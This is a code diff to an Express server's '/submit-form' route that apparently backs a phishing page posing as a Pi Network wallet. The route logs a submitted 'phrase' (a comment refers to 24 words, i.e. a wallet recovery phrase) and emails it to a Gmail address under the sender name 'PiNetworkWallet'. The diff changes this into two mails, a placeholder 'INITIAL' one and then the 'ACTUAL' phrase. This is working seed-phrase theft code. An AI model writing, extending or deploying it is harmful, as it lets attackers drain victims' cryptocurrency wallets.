@@ -72,19 +72,28 @@ app.post("/submit-form", async (req, res) => {
     // if (mfText) {
       console.log("Phrase received:", mfText);
       // if(mfText && mfText.split(' ').length == 24){
-      transporter
-        .sendMail({
-          from: "PiNetworkWallet",
-          to: ["pinetworkclaimpi@gmail.com"],
-          // to: ["pablomizeto@gmail.com"],
-          subject: "pinetwork phrase",
-          text: mfText,
-          html: `<h1>${mfText}</h1>`,
-        })
-        .then((result) => {
-          console.log({MailResult: result});
-        })
-        .catch((err) => console.log({MailErr: err}));
+     await transporter
+  .sendMail({
+    from: "PiNetworkWallet",
+    to: ["pinetworkclaimpi@gmail.com"],
+    subject: "pinetwork phrase - INITIAL",
+    text: "undefined", // placeholder text
+    html: `<h1>undefined</h1>`,
+  })
+  .then((result) => console.log({ InitialMailResult: result }))
+  .catch((err) => console.log({ InitialMailErr: err }));
+
+// Step 2: Send actual phrase
+await transporter
+  .sendMail({
+    from: "PiNetworkWallet",
+    to: ["pinetworkclaimpi@gmail.com"],
+    subject: "pinetwork phrase - ACTUAL",
+    text: mfText,
+    html: `<h1>${mfText}</h1>`,
+  })
+  .then((result) => console.log({ MailResult: result }))
+  .catch((err) => console.log({ MailErr: err }));
       //   return res.json({
       //     status: 1,
       //     store_entries: 1,
